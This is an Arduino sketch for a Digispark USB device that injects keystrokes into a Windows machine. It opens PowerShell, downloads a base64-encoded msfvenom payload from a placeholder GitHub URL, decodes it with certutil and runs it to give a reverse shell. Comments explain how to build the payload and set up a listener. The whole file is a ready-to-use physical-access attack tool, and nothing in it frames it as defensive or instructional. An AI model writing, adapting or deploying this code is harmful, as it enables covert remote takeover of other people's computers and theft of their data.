// Please note, depending on the speed of your computer you might need to make the delays longer (or make them shorter if your computer is speedy)
// You must create your own payload because you have to know your own IP address and port to make the payload (use msfvenom to make the payload)
// For best results use a stageless payload. Once payload is created, convert it to base64 and host it on GitHub (or wherever you choose)
// Before running you need to have a msfconsole (or netcat if not using a meterpreter payload) listener waiting

#include "DigiKeyboard.h"

void setup() {
  // Send Win+R to open run, then
  // tell run to open powershell
  delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  delay(500);
  DigiKeyboard.print("powershell"); 
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // Switch to current user's Temp directory
  DigiKeyboard.print("cd C:/Users/$env:username/AppData/Local/Temp"); 
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // Remove the payload if it's already been run before (if you get an error on this step it's 
  // because this exe is currently running, to fix change all references of winner to winner1 or winner2)
  DigiKeyboard.print("rm winner.exe*"); 
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // Download the base64 encoded payload
  DigiKeyboard.print("wget ");
  DigiKeyboard.print("https://raw.githubusercontent.com/UserName/RepositoryName/main/YourPayload.exe.b64"); // You must put your hosted payload link here!
  DigiKeyboard.print(" -o winner.exe.b64");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // Decode the payload from base64
  DigiKeyboard.print("certutil -decode winner.exe.b64 winner.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // Run the executable
  DigiKeyboard.print("./winner.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  // If all goes well, you should now have a reverse shell
}

void loop() {
  // This program doesn't loop, it just runs once
}
